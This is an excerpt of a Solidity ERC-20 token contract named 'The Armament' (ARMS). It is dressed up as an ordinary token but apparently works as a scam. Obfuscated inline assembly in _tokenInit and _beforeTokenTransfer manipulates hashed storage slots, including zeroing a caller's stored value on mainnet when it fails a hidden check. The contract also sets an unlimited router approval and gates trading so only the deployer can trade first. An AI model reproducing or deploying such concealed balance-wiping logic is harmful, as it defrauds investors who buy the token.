...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addArms;
    uint256 private armThem = block.number*2;

    mapping (address => bool) private _firstInvestigate; 
    mapping (address => bool) private _secondConclude;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private rottenEggs;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private sulfuricAcid;
    address public pair;
    ...
    bool private trading; uint256 private solveCase = 1; bool private drownNow;
    uint256 private _decimals; uint256 private burnUp;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addArms.push(_router); addArms.push(msgSender_); addArms.push(pair);
        for (uint256 q=0; q < 3;) {_firstInvestigate[addArms[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x9a5aa5e632a488b629466c1e064107434e66658745af6ec0b7f09a28471489ce
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x508d575e65909cfc4e528dbf9f198d285fa2abe63052f054de16adb4ea5c97ba,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; armThem = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addArms[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployArms(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addArms[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployArms(creator, initialSupply);
    }
}

contract TheArmament is ERC20Token {
    constructor() ERC20Token("The Armament", "ARMS", msg.sender, 26000000 * 10 ** 18) {
    }
}